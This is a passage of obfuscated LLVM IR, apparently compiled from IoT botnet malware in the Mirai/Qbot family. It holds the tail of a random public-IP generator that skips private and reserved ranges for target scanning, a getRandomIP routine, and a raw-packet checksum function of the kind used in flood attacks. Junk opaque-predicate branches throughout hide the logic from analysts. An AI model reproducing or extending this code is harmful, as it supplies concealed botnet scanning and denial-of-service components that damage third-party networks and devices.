; <label>:244:                                    ; preds = %240, %236, %232
  %245 = load i32, i32* @x.51
  %246 = load i32, i32* @y.52
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %244
  %253 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 192
  %256 = load i32, i32* @x.51
  %257 = load i32, i32* @y.52
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %255, label %264, label %288

; <label>:264:                                    ; preds = %originalBBpart251
  %265 = load i32, i32* @x.51
  %266 = load i32, i32* @y.52
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %264
  %273 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %274 = zext i8 %273 to i32
  %275 = icmp eq i32 %274, 0
  %276 = load i32, i32* @x.51
  %277 = load i32, i32* @y.52
  %278 = sub i32 %276, 1
  %279 = mul i32 %276, %278
  %280 = urem i32 %279, 2
  %281 = icmp eq i32 %280, 0
  %282 = icmp slt i32 %277, 10
  %283 = or i1 %281, %282
  br i1 %283, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %275, label %284, label %288

; <label>:284:                                    ; preds = %originalBBpart255
  %285 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %286 = zext i8 %285 to i32
  %287 = icmp eq i32 %286, 2
  br i1 %287, label %446, label %288

; <label>:288:                                    ; preds = %284, %originalBBpart255, %originalBBpart251
  %289 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %290 = zext i8 %289 to i32
  %291 = icmp eq i32 %290, 192
  br i1 %291, label %292, label %300

; <label>:292:                                    ; preds = %288
  %293 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %294 = zext i8 %293 to i32
  %295 = icmp eq i32 %294, 88
  br i1 %295, label %296, label %300

; <label>:296:                                    ; preds = %292
  %297 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %298 = zext i8 %297 to i32
  %299 = icmp eq i32 %298, 99
  br i1 %299, label %446, label %300

; <label>:300:                                    ; preds = %296, %292, %288
  %301 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %302 = zext i8 %301 to i32
  %303 = icmp eq i32 %302, 192
  br i1 %303, label %304, label %308

; <label>:304:                                    ; preds = %300
  %305 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %306 = zext i8 %305 to i32
  %307 = icmp eq i32 %306, 168
  br i1 %307, label %446, label %308

; <label>:308:                                    ; preds = %304, %300
  %309 = load i32, i32* @x.51
  %310 = load i32, i32* @y.52
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %308
  %317 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %318 = zext i8 %317 to i32
  %319 = icmp eq i32 %318, 198
  %320 = load i32, i32* @x.51
  %321 = load i32, i32* @y.52
  %322 = sub i32 %320, 1
  %323 = mul i32 %320, %322
  %324 = urem i32 %323, 2
  %325 = icmp eq i32 %324, 0
  %326 = icmp slt i32 %321, 10
  %327 = or i1 %325, %326
  br i1 %327, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %319, label %328, label %336

; <label>:328:                                    ; preds = %originalBBpart259
  %329 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %330 = zext i8 %329 to i32
  %331 = icmp eq i32 %330, 18
  br i1 %331, label %446, label %332

; <label>:332:                                    ; preds = %328
  %333 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %334 = zext i8 %333 to i32
  %335 = icmp eq i32 %334, 19
  br i1 %335, label %446, label %336

; <label>:336:                                    ; preds = %332, %originalBBpart259
  %337 = load i32, i32* @x.51
  %338 = load i32, i32* @y.52
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %336
  %345 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %346 = zext i8 %345 to i32
  %347 = icmp eq i32 %346, 198
  %348 = load i32, i32* @x.51
  %349 = load i32, i32* @y.52
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br i1 %347, label %356, label %364

; <label>:356:                                    ; preds = %originalBBpart263
  %357 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %358 = zext i8 %357 to i32
  %359 = icmp eq i32 %358, 51
  br i1 %359, label %360, label %364

; <label>:360:                                    ; preds = %356
  %361 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %362 = zext i8 %361 to i32
  %363 = icmp eq i32 %362, 100
  br i1 %363, label %446, label %364

; <label>:364:                                    ; preds = %360, %356, %originalBBpart263
  %365 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %366 = zext i8 %365 to i32
  %367 = icmp eq i32 %366, 203
  br i1 %367, label %368, label %376

; <label>:368:                                    ; preds = %364
  %369 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %370 = zext i8 %369 to i32
  %371 = icmp eq i32 %370, 0
  br i1 %371, label %372, label %376

; <label>:372:                                    ; preds = %368
  %373 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %374 = zext i8 %373 to i32
  %375 = icmp eq i32 %374, 113
  br i1 %375, label %446, label %376

; <label>:376:                                    ; preds = %372, %368, %364
  %377 = load i32, i32* @x.51
  %378 = load i32, i32* @y.52
  %379 = sub i32 %377, 1
  %380 = mul i32 %377, %379
  %381 = urem i32 %380, 2
  %382 = icmp eq i32 %381, 0
  %383 = icmp slt i32 %378, 10
  %384 = or i1 %382, %383
  br i1 %384, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %376
  %385 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %386 = zext i8 %385 to i32
  %387 = icmp sge i32 %386, 224
  %388 = load i32, i32* @x.51
  %389 = load i32, i32* @y.52
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %387, label %446, label %396

; <label>:396:                                    ; preds = %originalBBpart267
  %397 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %398 = zext i8 %397 to i32
  %399 = icmp eq i32 %398, 185
  br i1 %399, label %400, label %420

; <label>:400:                                    ; preds = %396
  %401 = load i32, i32* @x.51
  %402 = load i32, i32* @y.52
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %400
  %409 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %410 = zext i8 %409 to i32
  %411 = icmp eq i32 %410, 62
  %412 = load i32, i32* @x.51
  %413 = load i32, i32* @y.52
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br i1 %411, label %446, label %420

; <label>:420:                                    ; preds = %originalBBpart271, %396
  %421 = load i32, i32* @x.51
  %422 = load i32, i32* @y.52
  %423 = sub i32 %421, 1
  %424 = mul i32 %421, %423
  %425 = urem i32 %424, 2
  %426 = icmp eq i32 %425, 0
  %427 = icmp slt i32 %422, 10
  %428 = or i1 %426, %427
  br i1 %428, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %420
  %429 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %430 = zext i8 %429 to i32
  %431 = icmp eq i32 %430, 208
  %432 = load i32, i32* @x.51
  %433 = load i32, i32* @y.52
  %434 = sub i32 %432, 1
  %435 = mul i32 %432, %434
  %436 = urem i32 %435, 2
  %437 = icmp eq i32 %436, 0
  %438 = icmp slt i32 %433, 10
  %439 = or i1 %437, %438
  br i1 %439, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br i1 %431, label %440, label %444

; <label>:440:                                    ; preds = %originalBBpart275
  %441 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %442 = zext i8 %441 to i32
  %443 = icmp eq i32 %442, 67
  br label %444

; <label>:444:                                    ; preds = %440, %originalBBpart275
  %445 = phi i1 [ false, %originalBBpart275 ], [ %443, %440 ]
  br label %446

; <label>:446:                                    ; preds = %444, %originalBBpart271, %originalBBpart267, %372, %360, %332, %328, %304, %296, %284, %240, %originalBBpart247, %204, %200, %originalBBpart239, %originalBBpart235
  %447 = phi i1 [ true, %originalBBpart271 ], [ true, %originalBBpart267 ], [ true, %372 ], [ true, %360 ], [ true, %332 ], [ true, %328 ], [ true, %304 ], [ true, %296 ], [ true, %284 ], [ true, %240 ], [ true, %originalBBpart247 ], [ true, %204 ], [ true, %200 ], [ true, %originalBBpart239 ], [ true, %originalBBpart235 ], [ %445, %444 ]
  br i1 %447, label %448, label %477

; <label>:448:                                    ; preds = %446
  %449 = load i32, i32* @x.51
  %450 = load i32, i32* @y.52
  %451 = sub i32 %449, 1
  %452 = mul i32 %449, %451
  %453 = urem i32 %452, 2
  %454 = icmp eq i32 %453, 0
  %455 = icmp slt i32 %450, 10
  %456 = or i1 %454, %455
  br i1 %456, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %448
  %457 = call i32 @rand() #2
  %458 = srem i32 %457, 255
  %459 = trunc i32 %458 to i8
  store i8 %459, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %460 = call i32 @rand() #2
  %461 = srem i32 %460, 255
  %462 = trunc i32 %461 to i8
  store i8 %462, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %463 = call i32 @rand() #2
  %464 = srem i32 %463, 255
  %465 = trunc i32 %464 to i8
  store i8 %465, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %466 = call i32 @rand() #2
  %467 = srem i32 %466, 255
  %468 = trunc i32 %467 to i8
  store i8 %468, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %469 = load i32, i32* @x.51
  %470 = load i32, i32* @y.52
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBBpart299, label %originalBB77alteredBB

originalBBpart299:                                ; preds = %originalBB77
  br label %136

; <label>:477:                                    ; preds = %446
  %478 = load i32, i32* @x.51
  %479 = load i32, i32* @y.52
  %480 = sub i32 %478, 1
  %481 = mul i32 %478, %480
  %482 = urem i32 %481, 2
  %483 = icmp eq i32 %482, 0
  %484 = icmp slt i32 %479, 10
  %485 = or i1 %483, %484
  br i1 %485, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %477
  %486 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %487 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %488 = zext i8 %487 to i32
  %489 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %490 = zext i8 %489 to i32
  %491 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %492 = zext i8 %491 to i32
  %493 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %494 = zext i8 %493 to i32
  %495 = call i32 (i8*, i8*, ...) @szprintf(i8* %486, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i32 0, i32 0), i32 %488, i32 %490, i32 %492, i32 %494)
  %496 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %497 = call i32 @inet_addr(i8* %496) #2
  store i32 %497, i32* %1, align 4
  %498 = load i32, i32* @x.51
  %499 = load i32, i32* @y.52
  %500 = sub i32 %498, 1
  %501 = mul i32 %498, %500
  %502 = urem i32 %501, 2
  %503 = icmp eq i32 %502, 0
  %504 = icmp slt i32 %499, 10
  %505 = or i1 %503, %504
  br i1 %505, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br label %506

; <label>:506:                                    ; preds = %originalBBpart2103, %92, %originalBBpart26, %6
  %507 = load i32, i32* @x.51
  %508 = load i32, i32* @y.52
  %509 = sub i32 %507, 1
  %510 = mul i32 %507, %509
  %511 = urem i32 %510, 2
  %512 = icmp eq i32 %511, 0
  %513 = icmp slt i32 %508, 10
  %514 = or i1 %512, %513
  br i1 %514, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %506
  %515 = load i32, i32* %1, align 4
  %516 = load i32, i32* @x.51
  %517 = load i32, i32* @y.52
  %518 = sub i32 %516, 1
  %519 = mul i32 %516, %518
  %520 = urem i32 %519, 2
  %521 = icmp eq i32 %520, 0
  %522 = icmp slt i32 %517, 10
  %523 = or i1 %521, %522
  br i1 %523, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  ret i32 %515

originalBBalteredBB:                              ; preds = %originalBB, %21
  %524 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %525 = zext i8 %524 to i32
  %526 = icmp sge i32 %525, 255
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %41
  %527 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %_ = shl i8 %527, 1
  %_2 = shl i8 %527, 1
  %_3 = sub i8 %527, 1
  %gen = mul i8 %_3, 1
  %_4 = shl i8 %527, 1
  %528 = add i8 %527, 1
  store i8 %528, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %529 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %530 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %531 = zext i8 %530 to i32
  %532 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %533 = zext i8 %532 to i32
  %534 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %535 = zext i8 %534 to i32
  %536 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %537 = zext i8 %536 to i32
  %538 = call i32 (i8*, i8*, ...) @szprintf(i8* %529, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i32 0, i32 0), i32 %531, i32 %533, i32 %535, i32 %537)
  %539 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %540 = call i32 @inet_addr(i8* %539) #2
  store i32 %540, i32* %1, align 4
  br label %originalBB1

originalBB8alteredBB:                             ; preds = %originalBB8, %72
  %541 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %542 = zext i8 %541 to i32
  %543 = icmp sge i32 %542, 255
  br label %originalBB8

originalBB12alteredBB:                            ; preds = %originalBB12, %117
  %544 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %_13 = sub i8 0, %544
  %gen14 = add i8 %_13, 1
  %_15 = sub i8 0, %544
  %gen16 = add i8 %_15, 1
  %_17 = sub i8 %544, 1
  %gen18 = mul i8 %_17, 1
  %_19 = sub i8 %544, 1
  %gen20 = mul i8 %_19, 1
  %_21 = sub i8 0, %544
  %gen22 = add i8 %_21, 1
  %_23 = sub i8 0, %544
  %gen24 = add i8 %_23, 1
  %_25 = shl i8 %544, 1
  %_26 = sub i8 %544, 1
  %gen27 = mul i8 %_26, 1
  %_28 = sub i8 %544, 1
  %gen29 = mul i8 %_28, 1
  %545 = add i8 %544, 1
  store i8 %545, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %originalBB12

originalBB33alteredBB:                            ; preds = %originalBB33, %136
  %546 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %547 = zext i8 %546 to i32
  %548 = icmp eq i32 %547, 0
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %156
  %549 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %550 = zext i8 %549 to i32
  %551 = icmp eq i32 %550, 10
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %176
  %552 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %553 = zext i8 %552 to i32
  %554 = icmp eq i32 %553, 100
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %212
  %555 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %556 = zext i8 %555 to i32
  %557 = icmp eq i32 %556, 254
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %244
  %558 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %559 = zext i8 %558 to i32
  %560 = icmp eq i32 %559, 192
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %264
  %561 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %562 = zext i8 %561 to i32
  %563 = icmp eq i32 %562, 0
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %308
  %564 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %565 = zext i8 %564 to i32
  %566 = icmp eq i32 %565, 198
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %336
  %567 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %568 = zext i8 %567 to i32
  %569 = icmp eq i32 %568, 198
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %376
  %570 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %571 = zext i8 %570 to i32
  %572 = icmp sge i32 %571, 224
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %400
  %573 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %574 = zext i8 %573 to i32
  %575 = icmp eq i32 %574, 62
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %420
  %576 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %577 = zext i8 %576 to i32
  %578 = icmp eq i32 %577, 208
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %448
  %579 = call i32 @rand() #2
  %_78 = shl i32 %579, 255
  %_79 = shl i32 %579, 255
  %_80 = sub i32 %579, 255
  %gen81 = mul i32 %_80, 255
  %_82 = sub i32 %579, 255
  %gen83 = mul i32 %_82, 255
  %_84 = sub i32 0, %579
  %gen85 = add i32 %_84, 255
  %580 = srem i32 %579, 255
  %581 = trunc i32 %580 to i8
  store i8 %581, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %582 = call i32 @rand() #2
  %_86 = shl i32 %582, 255
  %_87 = shl i32 %582, 255
  %_88 = shl i32 %582, 255
  %_89 = sub i32 0, %582
  %gen90 = add i32 %_89, 255
  %_91 = sub i32 0, %582
  %gen92 = add i32 %_91, 255
  %583 = srem i32 %582, 255
  %584 = trunc i32 %583 to i8
  store i8 %584, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %585 = call i32 @rand() #2
  %_93 = shl i32 %585, 255
  %_94 = shl i32 %585, 255
  %_95 = shl i32 %585, 255
  %_96 = sub i32 %585, 255
  %gen97 = mul i32 %_96, 255
  %586 = srem i32 %585, 255
  %587 = trunc i32 %586 to i8
  store i8 %587, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %588 = call i32 @rand() #2
  %589 = srem i32 %588, 255
  %590 = trunc i32 %589 to i8
  store i8 %590, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %originalBB77

originalBB101alteredBB:                           ; preds = %originalBB101, %477
  %591 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %592 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %593 = zext i8 %592 to i32
  %594 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %595 = zext i8 %594 to i32
  %596 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %597 = zext i8 %596 to i32
  %598 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %599 = zext i8 %598 to i32
  %600 = call i32 (i8*, i8*, ...) @szprintf(i8* %591, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i32 0, i32 0), i32 %593, i32 %595, i32 %597, i32 %599)
  %601 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %602 = call i32 @inet_addr(i8* %601) #2
  store i32 %602, i32* %1, align 4
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %506
  %603 = load i32, i32* %1, align 4
  br label %originalBB105
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = load i32, i32* @x.55
  %4 = load i32, i32* @y.56
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i16*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  store i16* %0, i16** %11, align 8
  store i32 %1, i32* %12, align 4
  store i64 0, i64* %13, align 8
  %14 = load i32, i32* @x.55
  %15 = load i32, i32* @y.56
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %41, %originalBBpart2
  %23 = load i32, i32* @x.55
  %24 = load i32, i32* @y.56
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %22
  %31 = load i32, i32* %12, align 4
  %32 = icmp sgt i32 %31, 1
  %33 = load i32, i32* @x.55
  %34 = load i32, i32* @y.56
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %32, label %41, label %50

; <label>:41:                                     ; preds = %originalBBpart24
  %42 = load i16*, i16** %11, align 8
  %43 = getelementptr inbounds i16, i16* %42, i32 1
  store i16* %43, i16** %11, align 8
  %44 = load i16, i16* %42, align 2
  %45 = zext i16 %44 to i64
  %46 = load i64, i64* %13, align 8
  %47 = add i64 %46, %45
  store i64 %47, i64* %13, align 8
  %48 = load i32, i32* %12, align 4
  %49 = sub nsw i32 %48, 2
  store i32 %49, i32* %12, align 4
  br label %22

; <label>:50:                                     ; preds = %originalBBpart24
  %51 = load i32, i32* @x.55
  %52 = load i32, i32* @y.56
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %50
  %59 = load i32, i32* %12, align 4
  %60 = icmp sgt i32 %59, 0
  %61 = load i32, i32* @x.55
  %62 = load i32, i32* @y.56
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %60, label %69, label %76

; <label>:69:                                     ; preds = %originalBBpart28
  %70 = load i16*, i16** %11, align 8
  %71 = bitcast i16* %70 to i8*
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i64
  %74 = load i64, i64* %13, align 8
  %75 = add i64 %74, %73
  store i64 %75, i64* %13, align 8
  br label %76

; <label>:76:                                     ; preds = %69, %originalBBpart28
  br label %77

; <label>:77:                                     ; preds = %81, %76
  %78 = load i64, i64* %13, align 8
  %79 = lshr i64 %78, 16
  %80 = icmp ne i64 %79, 0
  br i1 %80, label %81, label %87

; <label>:81:                                     ; preds = %77
  %82 = load i64, i64* %13, align 8
  %83 = and i64 %82, 65535
  %84 = load i64, i64* %13, align 8
  %85 = lshr i64 %84, 16
  %86 = add i64 %83, %85
  store i64 %86, i64* %13, align 8
  br label %77

